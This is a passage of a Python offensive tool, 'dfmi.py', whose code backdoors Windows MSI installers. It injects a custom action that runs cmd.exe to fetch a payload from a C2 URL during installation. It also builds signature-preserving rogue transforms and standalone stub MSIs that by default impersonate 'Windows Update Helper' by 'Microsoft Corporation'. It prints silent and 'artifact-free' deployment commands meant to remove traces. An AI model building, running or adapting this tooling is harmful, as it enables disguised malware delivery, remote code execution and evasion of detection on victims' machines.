    print("\n[CustomActions]")
    out = _export_linux(msi, "CustomAction")
    found = False
    for line in out.split('\r\n'):
        if line and not line.startswith(('Action', 's72', 'CustomAction\t')):
            print(f"  {line[:120]}"); found = True
    if not found: print("  (none)")
    print("\n[InstallExecuteSequence]")
    for line in _export_linux(msi, "InstallExecuteSequence").split('\r\n')[3:]:
        if line.strip(): print(f"  {line}")
    print("\n[Properties]")
    relevant = ['ProductCode', 'ProductName', 'Manufacturer', 'CMDEXE']
    for line in _export_linux(msi, "Property").split('\r\n'):
        if any(line.startswith(k) for k in relevant): print(f"  {line}")
    print()

# Windows back-end

def _inject_windows(target, output, exe_args, exe_path='C:\\Windows\\System32\\cmd.exe', exe_prop='CMDEXE'):
    target = os.path.abspath(target)
    output = os.path.abspath(output)
    safe_args   = exe_args.replace("'", "''")
    safe_target = target.replace("'", "''")
    safe_output = output.replace("'", "''")

    ps_script = f"""
$ErrorActionPreference = 'Stop'
$target   = '{safe_target}'
$output   = '{safe_output}'
$exeProp  = '{exe_prop}'
$exePath  = '{exe_path}'
$caArgs   = '{safe_args}'

Write-Host "[PS] Copying MSI..."
Copy-Item $target $output -Force

$installer = New-Object -ComObject WindowsInstaller.Installer

$newProd = "{{" + [guid]::NewGuid().ToString().ToUpper() + "}}"
$newPkg  = "{{" + [guid]::NewGuid().ToString().ToUpper() + "}}"

$db = $installer.OpenDatabase($output, 1)
try {{
    $v = $db.OpenView("UPDATE ``Property`` SET ``Value``='$newProd' WHERE ``Property``='ProductCode'")
    $v.Execute(); $v.Close()
    $v = $db.OpenView("UPDATE ``Property`` SET ``Value``='$newProd' WHERE ``Property``='UpgradeCode'")
    $v.Execute(); $v.Close()
}} catch {{}}
Write-Host "[PS] New ProductCode: $newProd"

try {{
    $v = $db.OpenView("INSERT INTO ``Property`` (``Property``,``Value``) VALUES ('$exeProp','$exePath')")
    $v.Execute(); $v.Close()
    Write-Host "[PS] Property: OK"
}} catch {{
    try {{
        $v = $db.OpenView("UPDATE ``Property`` SET ``Value``='$exePath' WHERE ``Property``='$exeProp'")
        $v.Execute(); $v.Close()
        Write-Host "[PS] Property: OK (updated)"
    }} catch {{ Write-Host "[PS] Property: FAIL ${{_}}" }}
}}

try {{
    $v = $db.OpenView("CREATE TABLE ``CustomAction`` (``Action`` CHAR(72) NOT NULL, ``Type`` SHORT NOT NULL, ``Source`` CHAR(72), ``Target`` CHAR(255), ``ExtendedType`` LONG PRIMARY KEY ``Action``)")
    $v.Execute(); $v.Close()
    Write-Host "[PS] Created CustomAction table"
}} catch {{}}

try {{
    $v = $db.OpenView("INSERT INTO ``CustomAction`` (``Action``,``Type``,``Source``,``Target``) VALUES ('WU',50,'$exeProp','$caArgs')")
    $v.Execute(); $v.Close()
    Write-Host "[PS] CustomAction: OK"
}} catch {{ Write-Host "[PS] CustomAction: FAIL ${{_}}"; exit 1 }}

try {{
    $v = $db.OpenView("CREATE TABLE ``InstallExecuteSequence`` (``Action`` CHAR(72) NOT NULL, ``Condition`` CHAR(255), ``Sequence`` SHORT PRIMARY KEY ``Action``)")
    $v.Execute(); $v.Close()
    Write-Host "[PS] Created InstallExecuteSequence table"
}} catch {{}}

try {{
    $v = $db.OpenView("INSERT INTO ``InstallExecuteSequence`` (``Action``,``Condition``,``Sequence``) VALUES ('WU','',1510)")
    $v.Execute(); $v.Close()
    Write-Host "[PS] Sequence: OK"
}} catch {{ Write-Host "[PS] Sequence: FAIL ${{_}}"; exit 1 }}

# Update PackageCode — same $db, before commit
try {{
    $si = $db.SummaryInformation(10)
    $si.Property(9) = $newPkg
    $si.Persist()
    Write-Host "[PS] New PackageCode: $newPkg"
}} catch {{
    Write-Host "[PS] PackageCode update skipped: ${{_}}"
}}

# Verify before commit
$v = $db.OpenView("SELECT Target FROM CustomAction WHERE Action='WU'")
$v.Execute()
$r = $v.Fetch()
if ($r) {{
    Write-Host "[PS] Verified CustomAction: OK"
}} else {{
    Write-Host "[PS] Verified CustomAction: MISSING"; exit 1
}}
$v.Close()

$db.Commit()
Write-Host "[PS] Done: $output"
Write-Host "PRODCODE:$newProd"
"""

    print("[*] Running PowerShell inject backend...")
    ok, stdout, stderr = run_ps(ps_script)
    prod_code = "{ProductCode}"
    for line in stdout.split('\n'):
        line = line.strip()
        if line:
            if line.startswith('PRODCODE:'):
                prod_code = line.replace('PRODCODE:', '').strip()
            else:
                print(f"  {line}")
    if stderr and not ok:
        print(f"\n[!] PowerShell error:")
        for line in stderr.split('\n'):
            if line.strip(): print(f"    {line.strip()}")
    if not ok:
        print("[!] inject failed"); return False
    return prod_code

def _inspect_windows(msi):
    msi = os.path.abspath(msi)
    safe_msi = msi.replace("'", "''")
    ps_script = f"""
$installer = New-Object -ComObject WindowsInstaller.Installer
$db = $installer.OpenDatabase('{safe_msi}', 0)
Write-Host "\n{'='*60}"
Write-Host "  MSI: {msi}"
Write-Host "{'='*60}"
Write-Host "\n[CustomActions]"
try {{
    $v = $db.OpenView("SELECT Action,Type,Source,Target FROM CustomAction")
    $v.Execute(); $found = $false
    while ($true) {{
        $r = $v.Fetch(); if ($r -eq $null) {{ break }}
        $tgt = $r.StringData(4)
        if ($tgt.Length -gt 60) {{ $tgt = $tgt.Substring(0,60) + "..." }}
        Write-Host ("  " + $r.StringData(1) + "  Type=" + $r.IntegerData(2) + "  " + $r.StringData(3) + "  " + $tgt)
        $found = $true
    }}
    $v.Close()
    if (-not $found) {{ Write-Host "  (none)" }}
}} catch {{ Write-Host "  (none)" }}
Write-Host "\n[Properties]"
$v = $db.OpenView("SELECT Property,Value FROM Property WHERE Property IN ('ProductCode','ProductName','Manufacturer','CMDEXE')")
$v.Execute()
while ($true) {{
    $r = $v.Fetch(); if ($r -eq $null) {{ break }}
    Write-Host ("  " + $r.StringData(1) + " = " + $r.StringData(2))
}}
$v.Close()
"""
    ok, stdout, stderr = run_ps(ps_script)
    if stdout: print(stdout)
    if stderr and not ok: print(f"[!] {stderr}")

def cmd_inject(args):
    if not args or args[0] in ('-h', '--help'):
        print(HELP_INJECT); return
    if '--inspect' in args:
        idx = args.index('--inspect')
        msi = args[idx+1] if idx+1 < len(args) else None
        if not msi: print("[!] --inspect requires a target MSI path"); return
        _inspect_windows(msi) if is_windows() else _inspect_linux(msi)
        return
    parsed = _parse_inject_args(args)
    if parsed is None:
        print("[!] Missing required arguments.\n"); print(HELP_INJECT); return
    target, output, c2_url, mode = parsed
    if not os.path.exists(target):
        print(f"[!] Target not found: {target}"); return
    print(f"[*] Target : {target}")
    print(f"[*] C2 URL : {c2_url}")
    print(f"[*] Output : {output}")
    print(f"[*] Mode   : {mode}")
    print()
    if mode == "ps": exe_args = build_ca_ps(c2_url)
    elif mode == "cmd": exe_args = build_ca_cmd(c2_url)
    else: print(f"[!] Unknown mode: {mode}"); return
    print(f"[*] CA args length: {len(exe_args)}")
    print(f"[*] Backend: {'PowerShell (Windows)' if is_windows() else 'msibuild (Linux)'}")
    print()
    prod_code = _inject_windows(target, output, exe_args) if is_windows() else _inject_linux(target, output, exe_args)
    if not prod_code: return
    size = os.path.getsize(output) if os.path.exists(output) else 0
    print(f"\n[+] Output: {output} ({size:,} bytes)")
    print()
    print("=" * 60)
    print("DEPLOY (silent):")
    print(f'  msiexec /i "{output}" /qn')
    print()
    print("DEPLOY (verbose log):")
    print(f'  msiexec /i "{output}" /l*v install.log')
    print()
    print("ARTIFACT-FREE:")
    print(f'  msiexec /i "{output}" /qn && msiexec /x {prod_code} /qn')
    print("=" * 60)

def _parse_inject_args(args):
    if len(args) < 2: return None
    target = args[0]; output = args[1]; rest = args[2:]
    c2_url = None; mode = "ps"
    i = 0
    while i < len(rest):
        if rest[i] == '--c2' and i+1 < len(rest): c2_url = rest[i+1]; i += 2
        elif rest[i] == '--mode' and i+1 < len(rest): mode = rest[i+1]; i += 2
        elif rest[i] in ('-h', '--help'): return 'help'
        else: i += 1
    if not c2_url: return None
    return target, output, c2_url, mode

# Rogue-Mst Module

HELP_ROGUE_MST = """
Command: rogue-mst
==================
Generate a .mst transform for an existing MSI. [Windows only]
Original MSI Authenticode signature stays valid.
PowerShell COM backend — no pip install needed.

Usage:
  python3 dfmi.py rogue-mst build  <original.msi> <output.mst> --c2 <url> [--mode ps|cmd]
  python3 dfmi.py rogue-mst verify <original.msi> <transform.mst>
  python3 dfmi.py rogue-mst deploy <original.msi> <transform.mst>

Deploy:
  msiexec /i original.msi TRANSFORMS=payload.mst /qn
"""

def _rogue_mst_build(original, output, c2_url, mode="ps"):
    if not is_windows():
        print("[!] rogue-mst requires Windows."); return False
    if not os.path.exists(original):
        print(f"[!] File not found: {original}"); return False
    original = os.path.abspath(original)
    output   = os.path.abspath(output)
    print(f"[*] Original : {original}")
    print(f"[*] Output   : {output}")
    print(f"[*] C2 URL   : {c2_url}")
    print(f"[*] Mode     : {mode}")
    print()
    if mode == "ps": exe_args = build_ca_ps(c2_url)
    elif mode == "cmd": exe_args = build_ca_cmd(c2_url)
    else: print(f"[!] Unknown mode: {mode}"); return False
    safe_orig   = original.replace("'", "''")
    safe_output = output.replace("'", "''")
    safe_args   = exe_args.replace("'", "''")
    ps_script = f"""
$ErrorActionPreference = 'Stop'
$original = '{safe_orig}'
$output   = '{safe_output}'
$exeProp  = 'CMDEXE'
$exePath  = 'C:\\Windows\\System32\\cmd.exe'
$caArgs   = '{safe_args}'
$installer = New-Object -ComObject WindowsInstaller.Installer
Write-Host "[PS] Opening reference and working copy..."
$dbRef  = $installer.OpenDatabase($original, 0)
$tmp    = [System.IO.Path]::GetTempFileName() + ".msi"
Copy-Item $original $tmp
$dbWork = $installer.OpenDatabase($tmp, 1)
Write-Host "[PS] Injecting Property..."
try {{
    $v = $dbWork.OpenView("INSERT INTO ``Property`` (``Property``,``Value``) VALUES ('$exeProp','$exePath')")
    $v.Execute(); $v.Close(); Write-Host "[PS] Property: OK"
}} catch {{
    try {{
        $v = $dbWork.OpenView("UPDATE ``Property`` SET ``Value``='$exePath' WHERE ``Property``='$exeProp'")
        $v.Execute(); $v.Close(); Write-Host "[PS] Property: OK (updated)"
    }} catch {{ Write-Host "[PS] Property error: ${{_}}" }}
}}
try {{
    $v = $dbWork.OpenView("CREATE TABLE ``CustomAction`` (``Action`` CHAR(72) NOT NULL, ``Type`` SHORT NOT NULL, ``Source`` CHAR(72), ``Target`` CHAR(255), ``ExtendedType`` LONG PRIMARY KEY ``Action``)")
    $v.Execute(); $v.Close(); Write-Host "[PS] CustomAction table created"
}} catch {{}}
$v = $dbWork.OpenView("INSERT INTO ``CustomAction`` (``Action``,``Type``,``Source``,``Target``) VALUES ('WU',50,'$exeProp','$caArgs')")
$v.Execute(); $v.Close(); Write-Host "[PS] CustomAction: OK"
try {{
    $v = $dbWork.OpenView("CREATE TABLE ``InstallExecuteSequence`` (``Action`` CHAR(72) NOT NULL, ``Condition`` CHAR(255), ``Sequence`` SHORT PRIMARY KEY ``Action``)")
    $v.Execute(); $v.Close(); Write-Host "[PS] InstallExecuteSequence table created"
}} catch {{}}
$v = $dbWork.OpenView("INSERT INTO ``InstallExecuteSequence`` (``Action``,``Condition``,``Sequence``) VALUES ('WU','',1510)")
$v.Execute(); $v.Close(); Write-Host "[PS] Sequence: OK"
$dbWork.Commit()
Write-Host "[PS] Generating transform..."
if (Test-Path $output) {{ Remove-Item $output -Force }}
$dbWork.GenerateTransform($dbRef, $output)
$dbWork.CreateTransformSummaryInfo($dbRef, $output, 0, 0)
Remove-Item $tmp -Force -ErrorAction SilentlyContinue
Write-Host "[PS] Done: $output"
"""
    print("[*] Running PowerShell MST builder...")
    ok, stdout, stderr = run_ps(ps_script)
    for line in stdout.split('\n'):
        if line.strip(): print(f"  {line.strip()}")
    if not ok:
        if stderr:
            print(f"\n[!] Error:")
            for line in stderr.split('\n'):
                if line.strip(): print(f"    {line.strip()}")
        print("[!] rogue-mst build failed"); return False
    if not os.path.exists(output):
        print("[!] Output file not created"); return False
    ps_pc = f"""
$installer = New-Object -ComObject WindowsInstaller.Installer
$db = $installer.OpenDatabase('{safe_orig}', 0)
$v = $db.OpenView("SELECT Value FROM Property WHERE Property='ProductCode'")
$v.Execute(); $r = $v.Fetch()
if ($r) {{ $r.StringData(1) }}
"""
    ok2, pc, _ = run_ps(ps_pc)
    prod_code = pc.strip() if ok2 and pc.strip() else "{ProductCode}"
    orig_name = os.path.basename(original)
    mst_name  = os.path.basename(output)
    size = os.path.getsize(output)
    print(f"\n[+] Transform: {output} ({size:,} bytes)")
    print()
    print("=" * 60)
    print("DEPLOY (silent):")
    print(f'  msiexec /i "{orig_name}" TRANSFORMS="{mst_name}" /qn')
    print()
    print("ARTIFACT-FREE:")
    print(f'  msiexec /i "{orig_name}" TRANSFORMS="{mst_name}" /qn')
    print(f'  msiexec /x {prod_code} /qn')
    print("=" * 60)
    return True

def _rogue_mst_verify(original, transform):
    if not is_windows():
        print("[!] rogue-mst requires Windows."); return False
    for f in [original, transform]:
        if not os.path.exists(f):
            print(f"[!] File not found: {f}"); return False
    original  = os.path.abspath(original)
    transform = os.path.abspath(transform)
    ps_script = f"""
$installer = New-Object -ComObject WindowsInstaller.Installer
$db = $installer.OpenDatabase('{original.replace("'","''")}', 1)
$db.ApplyTransform('{transform.replace("'","''")}', 0)
Write-Host "[CustomActions after transform]"
$v = $db.OpenView("SELECT Action,Type,Source,Target FROM CustomAction")
$v.Execute(); $found = $false
while ($true) {{
    $r = $v.Fetch(); if ($r -eq $null) {{ break }}
    $tgt = $r.StringData(4)
    if ($tgt.Length -gt 60) {{ $tgt = $tgt.Substring(0,60) + "..." }}
    Write-Host ("  " + $r.StringData(1).PadRight(20) + " Type=" + $r.IntegerData(2) + "  " + $r.StringData(3).PadRight(10) + " " + $tgt)
    if ($r.StringData(1) -eq 'WU') {{ $found = $true }}
}}
$v.Close()
if ($found) {{
    Write-Host ""
    Write-Host "[+] Backdoor CA 'WU' found"
    $v2 = $db.OpenView("SELECT Sequence FROM InstallExecuteSequence WHERE Action='WU'")
    $v2.Execute(); $r2 = $v2.Fetch()
    if ($r2) {{ Write-Host ("[+] Sequence: WU @ " + $r2.IntegerData(1)) }}
    $v2.Close()
}} else {{ Write-Host "[-] Backdoor CA 'WU' NOT found" }}
"""
    ok, stdout, stderr = run_ps(ps_script)
    if stdout: print(stdout)
    if stderr and not ok: print(f"[!] {stderr}")
    return ok

def _rogue_mst_deploy(original, transform):
    for f in [original, transform]:
        if not os.path.exists(f):
            print(f"[!] File not found: {f}"); return False
    original  = os.path.abspath(original)
    transform = os.path.abspath(transform)
    cmd = ['msiexec', '/i', original, f'TRANSFORMS={transform}', '/l*v', 'install.log']
    print(f"[*] Running: {' '.join(cmd)}")
    r = subprocess.run(cmd)
    print(f"[*] Exit code: {r.returncode}")
    return r.returncode == 0

def cmd_rogue_mst(args):
    if not args or args[0] in ('-h', '--help'):
        print(HELP_ROGUE_MST); return
    sub  = args[0]; rest = args[1:]
    if sub == 'build':
        if not rest or rest[0] in ('-h', '--help'): print(HELP_ROGUE_MST); return
        parsed = _parse_mst_build_args(rest)
        if parsed is None: print("[!] --c2 <url> is required.\n"); print(HELP_ROGUE_MST); return
        original, output, c2_url, mode = parsed
        _rogue_mst_build(original, output, c2_url, mode)
    elif sub == 'verify':
        if len(rest) < 2: print("[!] Usage: dfmi.py rogue-mst verify <original.msi> <transform.mst>"); return
        _rogue_mst_verify(rest[0], rest[1])
    elif sub == 'deploy':
        if len(rest) < 2: print("[!] Usage: dfmi.py rogue-mst deploy <original.msi> <transform.mst>"); return
        _rogue_mst_deploy(rest[0], rest[1])
    else:
        print(f"[!] Unknown rogue-mst subcommand: {sub}"); print(HELP_ROGUE_MST)

def _parse_mst_build_args(args):
    if len(args) < 2: return None
    original = args[0]; output = args[1]; rest = args[2:]
    c2_url = None; mode = "ps"
    i = 0
    while i < len(rest):
        if rest[i] == '--c2' and i+1 < len(rest): c2_url = rest[i+1]; i += 2
        elif rest[i] == '--mode' and i+1 < len(rest): mode = rest[i+1]; i += 2
        elif rest[i] in ('-h', '--help'): return 'help'
        else: i += 1
    if not c2_url: return None
    return original, output, c2_url, mode

# Stub Module (Cross-Platform)

HELP_STUB = """
Command: stub
=============
Create a standalone backdoor MSI from scratch. (Cross-platform)
  Kali:    requires wixl + msitools (apt install wixl msitools)
  Windows: uses embedded base MSI + PowerShell COM (no extra tools)

No original MSI needed. Fully customizable metadata.
The stub installs nothing — only executes your payload.

Usage:
  python3 dfmi.py stub --c2 <url> [options]

Options:
  --c2 <url>              Payload URL (required)
  --mode ps|cmd           Delivery mode (default: ps)
  --name <n>           Product name
  --manufacturer <n>   Manufacturer
  --version <ver>         Version string (default: 1.0.0.0)
  -o <output.msi>         Output file (default: stub.msi)

Examples:
  python3 dfmi.py stub --c2 http://<C2>/payload.ps1
  python3 dfmi.py stub --c2 http://<C2>/payload.ps1 --name "Adobe Updater" --manufacturer "Adobe Inc." -o adobe.msi
  python3 dfmi.py stub --c2 http://<C2>/loader.exe --mode cmd -o update.msi
"""

def _stub_linux(c2_url, mode, name, manufacturer, version, output, exe_args, prod_guid, upg_guid, comp_guid):
    exe_path = 'C:\\Windows\\System32\\cmd.exe'
    wxs = f"""<?xml version="1.0" encoding="UTF-8"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
  <Product Id="{prod_guid}" Name="{name}" Language="1033"
           Version="{version}" Manufacturer="{manufacturer}"
           UpgradeCode="{upg_guid}">
    <Package InstallerVersion="200" Compressed="yes" InstallScope="perMachine"/>
    <MediaTemplate EmbedCab="yes"/>
    <Feature Id="ProductFeature" Title="Main" Level="1">
      <ComponentRef Id="EmptyComp"/>
    </Feature>
    <Directory Id="TARGETDIR" Name="SourceDir">
      <Directory Id="TempFolder">
        <Component Id="EmptyComp" Guid="{comp_guid}">
          <CreateFolder/>
        </Component>
      </Directory>
    </Directory>
  </Product>
</Wix>"""
    tmpdir = tempfile.mkdtemp()
    wxs_path = os.path.join(tmpdir, "stub.wxs")
    msi_path = os.path.join(tmpdir, "stub.msi")
    try:
        with open(wxs_path, 'w') as f:
            f.write(wxs)
        print("[*] Building base MSI via wixl...")
        r = subprocess.run(['wixl', '-o', msi_path, wxs_path], capture_output=True, text=True)
        if r.returncode != 0:
            print(f"[!] wixl failed: {r.stderr.strip()}"); return False
        print(f"    Base MSI: {os.path.getsize(msi_path):,} bytes")
        def sql(q):
            r = subprocess.run(['msibuild', msi_path, '-q', q], capture_output=True, text=True)
            return r.returncode == 0, r.stderr.strip()
        print("[*] Injecting Property...")
        ok, e = sql(f"INSERT INTO Property (Property, Value) VALUES ('CMDEXE', '{exe_path}')")
        print(f"    {'OK' if ok else 'FAIL: '+e}")
        print("[*] Injecting CustomAction...")
        ok, e = sql(f"INSERT INTO CustomAction (Action, Type, Source, Target) VALUES ('WU', 50, 'CMDEXE', '{exe_args}')")
        if not ok: print(f"    FAIL: {e}"); return False
        print(f"    OK")
        print("[*] Injecting Sequence...")
        ok, e = sql("INSERT INTO InstallExecuteSequence (Action, Condition, Sequence) VALUES ('WU', '', 1510)")
        if not ok: print(f"    FAIL: {e}"); return False
        print(f"    OK")
        new_pkg = gen_guid()
        r2 = subprocess.run(['msiinfo', 'suminfo', msi_path], capture_output=True, text=True)
        info = {}
        for line in r2.stdout.strip().split('\n'):
            if ': ' in line:
                k, v = line.split(': ', 1); info[k.strip()] = v.strip()
        title_val  = info.get('Title', name)
        author_val = info.get('Author', manufacturer)
        subprocess.run(['msibuild', msi_path, '-s', title_val, author_val, '', new_pkg], capture_output=True)
        print(f"[*] PackageCode : {new_pkg}")
        shutil.copy(msi_path, output)
        return True
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)

def _stub_windows(c2_url, mode, name, manufacturer, version, output, exe_args, prod_guid, upg_guid, comp_guid):
    output = os.path.abspath(output)
    safe_output   = output.replace("'", "''")
    safe_args     = exe_args.replace("'", "''").replace('"', '`"')
    safe_name     = name.replace("'", "''")
    safe_mfr      = manufacturer.replace("'", "''")

    ps_script = f"""
$ErrorActionPreference = 'Stop'
$output = '{safe_output}'

# Extract embedded base MSI from base64
$b64 = '{BASE_MSI_B64}'
$bytes = [Convert]::FromBase64String($b64)
[IO.File]::WriteAllBytes($output, $bytes)
Write-Host "[PS] Base MSI extracted"

$installer = New-Object -ComObject WindowsInstaller.Installer
$db = $installer.OpenDatabase($output, 1)

# Update metadata
$newProd = "{prod_guid}"
$newPkg  = "{{" + [guid]::NewGuid().ToString().ToUpper() + "}}"

try {{
    $v = $db.OpenView("UPDATE ``Property`` SET ``Value``='$newProd' WHERE ``Property``='ProductCode'")
    $v.Execute(); $v.Close()
    $v = $db.OpenView("UPDATE ``Property`` SET ``Value``='$newProd' WHERE ``Property``='UpgradeCode'")
    $v.Execute(); $v.Close()
    $v = $db.OpenView("UPDATE ``Property`` SET ``Value``='{safe_name}' WHERE ``Property``='ProductName'")
    $v.Execute(); $v.Close()
}} catch {{}}

# Inject Property
try {{
    $v = $db.OpenView("INSERT INTO ``Property`` (``Property``,``Value``) VALUES ('CMDEXE','C:\\Windows\\System32\\cmd.exe')")
    $v.Execute(); $v.Close()
    Write-Host "[PS] Property: OK"
}} catch {{
    try {{
        $v = $db.OpenView("UPDATE ``Property`` SET ``Value``='C:\\Windows\\System32\\cmd.exe' WHERE ``Property``='CMDEXE'")
        $v.Execute(); $v.Close()
        Write-Host "[PS] Property: OK (updated)"
    }} catch {{ Write-Host "[PS] Property: FAIL ${{_}}" }}
}}

# CustomAction table (may already exist in base MSI)
try {{
    $v = $db.OpenView("CREATE TABLE ``CustomAction`` (``Action`` CHAR(72) NOT NULL, ``Type`` SHORT NOT NULL, ``Source`` CHAR(72), ``Target`` CHAR(255), ``ExtendedType`` LONG PRIMARY KEY ``Action``)")
    $v.Execute(); $v.Close()
}} catch {{}}

$v = $db.OpenView("INSERT INTO ``CustomAction`` (``Action``,``Type``,``Source``,``Target``) VALUES ('WU',50,'CMDEXE','{safe_args}')")
$v.Execute(); $v.Close()
Write-Host "[PS] CustomAction: OK"

try {{
    $v = $db.OpenView("CREATE TABLE ``InstallExecuteSequence`` (``Action`` CHAR(72) NOT NULL, ``Condition`` CHAR(255), ``Sequence`` SHORT PRIMARY KEY ``Action``)")
    $v.Execute(); $v.Close()
}} catch {{}}

$v = $db.OpenView("INSERT INTO ``InstallExecuteSequence`` (``Action``,``Condition``,``Sequence``) VALUES ('WU','',1510)")
$v.Execute(); $v.Close()
Write-Host "[PS] Sequence: OK"

# Update PackageCode via SummaryInformation — same $db, before commit
try {{
    $si = $db.SummaryInformation(10)
    $si.Property(9) = $newPkg
    $si.Persist()
    Write-Host "[PS] New PackageCode: $newPkg"
}} catch {{
    Write-Host "[PS] PackageCode update skipped: ${{_}}"
}}

# Verify CustomAction before commit
$v = $db.OpenView("SELECT Target FROM CustomAction WHERE Action='WU'")
$v.Execute()
$r = $v.Fetch()
if ($r) {{
    Write-Host "[PS] Verified CustomAction: OK"
}} else {{
    Write-Host "[PS] Verified CustomAction: MISSING"; exit 1
}}
$v.Close()

$db.Commit()
Write-Host "[PS] Done: $output"
Write-Host "PRODCODE:$newProd"
"""
    print("[*] Running PowerShell stub builder...")
    ok, stdout, stderr = run_ps(ps_script)
    prod_code_out = prod_guid
    for line in stdout.split('\n'):
        line = line.strip()
        if line:
            if line.startswith('PRODCODE:'): prod_code_out = line.replace('PRODCODE:','').strip()
            else: print(f"  {line}")
    if not ok:
        if stderr:
            print("\n[!] PowerShell error:")
            for line in stderr.split('\n'):
                if line.strip(): print(f"    {line.strip()}")
        print("[!] stub build failed"); return False
    return prod_code_out

def cmd_stub(args):
    if not args or args[0] in ('-h', '--help'):
        print(HELP_STUB); return
    parsed = _parse_stub_args(args)
    if parsed is None:
        print("[!] --c2 <url> is required.\n"); print(HELP_STUB); return
    c2_url, mode, name, manufacturer, version, output = parsed
    print(f"[*] C2 URL      : {c2_url}")
    print(f"[*] Mode        : {mode}")
    print(f"[*] Name        : {name}")
    print(f"[*] Manufacturer: {manufacturer}")
    print(f"[*] Version     : {version}")
    print(f"[*] Output      : {output}")
    print(f"[*] Platform    : {'Windows' if is_windows() else 'Linux'}")
    print()
    if mode == "ps": exe_args = build_ca_ps(c2_url)
    elif mode == "cmd": exe_args = build_ca_cmd(c2_url)
    else: print(f"[!] Unknown mode: {mode}"); return
    prod_guid = gen_guid(); upg_guid = gen_guid(); comp_guid = gen_guid()
    print(f"[*] ProductCode : {prod_guid}")
    if is_windows():
        prod_code = _stub_windows(c2_url, mode, name, manufacturer, version, output, exe_args, prod_guid, upg_guid, comp_guid)
    else:
        ok = _stub_linux(c2_url, mode, name, manufacturer, version, output, exe_args, prod_guid, upg_guid, comp_guid)
        prod_code = prod_guid if ok else None
    if not prod_code: return
    size = os.path.getsize(output) if os.path.exists(output) else 0
    print(f"\n[+] Output: {output} ({size:,} bytes)")
    print()
    print("=" * 60)
    print("DEPLOY (silent):")
    print(f'  msiexec /i "{output}" /qn')
    print()
    print("ARTIFACT-FREE:")
    print(f'  msiexec /i "{output}" /qn && msiexec /x {prod_code} /qn')
    print("=" * 60)

def _parse_stub_args(args):
    c2_url = None; mode = "ps"
    name = "Windows Update Helper"; manufacturer = "Microsoft Corporation"
    version = "1.0.0.0"; output = "stub.msi"
    i = 0
    while i < len(args):
        a = args[i]
        if a == '--c2' and i+1 < len(args): c2_url = args[i+1]; i += 2
        elif a == '--mode' and i+1 < len(args): mode = args[i+1]; i += 2
        elif a == '--name' and i+1 < len(args): name = args[i+1]; i += 2
        elif a == '--manufacturer' and i+1 < len(args): manufacturer = args[i+1]; i += 2
        elif a == '--version' and i+1 < len(args): version = args[i+1]; i += 2
        elif a in ('-o', '--output') and i+1 < len(args): output = args[i+1]; i += 2
        elif a in ('-h', '--help'): return 'help'
        else: i += 1
    if not c2_url: return None
    return c2_url, mode, name, manufacturer, version, output

if __name__ == "__main__":
    print(BANNER)
    if len(sys.argv) < 2 or sys.argv[1] in ('-h', '--help'):
        print(HELP_MAIN); sys.exit(0)
    command = sys.argv[1]
    rest    = sys.argv[2:]
    if command == 'inject': cmd_inject(rest)
    elif command == 'rogue-mst': cmd_rogue_mst(rest)
    elif command == 'stub': cmd_stub(rest)
    else:
        print(f"[!] Unknown command: {command}\n")
        print(HELP_MAIN); sys.exit(1)
